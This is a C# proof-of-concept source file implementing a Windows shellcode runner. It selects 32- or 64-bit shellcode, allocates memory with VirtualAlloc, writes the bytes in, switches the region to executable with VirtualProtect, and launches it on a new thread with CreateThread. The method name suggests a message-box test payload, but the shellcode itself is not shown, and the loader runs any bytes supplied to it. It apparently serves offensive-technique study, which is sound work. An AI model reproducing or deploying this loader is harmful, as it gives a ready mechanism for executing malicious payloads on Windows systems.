using System;
using Win32ApiLibrary;

namespace CreateThreadPoC
{
    internal class PoC
    {
        internal static void PopMessageBox()
        {
            bool isWindows = Win32ApiHelpers.CheckValidOperatingSystem();
            if (!isWindows)
            {
                return;
            }

            byte[] shellcode;

            if (Environment.Is64BitProcess)
            {
                shellcode = Shellcode.x64;
            }
            else
            {
                shellcode = Shellcode.x32;
            }

            InjectCreateThread(shellcode);
        }

        private static void InjectCreateThread(byte[] data)
        {
            uint dataSize = (uint)data.Length;
            var currentProcess = Win32Api.GetCurrentProcess();

            var baseAddr = Win32Api.VirtualAlloc(
                IntPtr.Zero,
                dataSize,
                Win32Api.AllocationType.Commit,
                Win32Api.MemoryProtection.ReadWrite);

            Win32Api.WriteProcessMemory(
                currentProcess,
                baseAddr,
                data,
                dataSize,
                out _);

            Win32Api.VirtualProtect(
                baseAddr,
                dataSize,
                Win32Api.MemoryProtection.ExecuteRead,
                out _);
            
            var threadHandle = Win32Api.CreateThread(
                IntPtr.Zero,
                0,
                baseAddr,
                IntPtr.Zero,
                0,
                out _);

            Win32Api.WaitForSingleObject(threadHandle, 60000);
            Win32Api.CloseHandle(threadHandle);
        }
    }
}
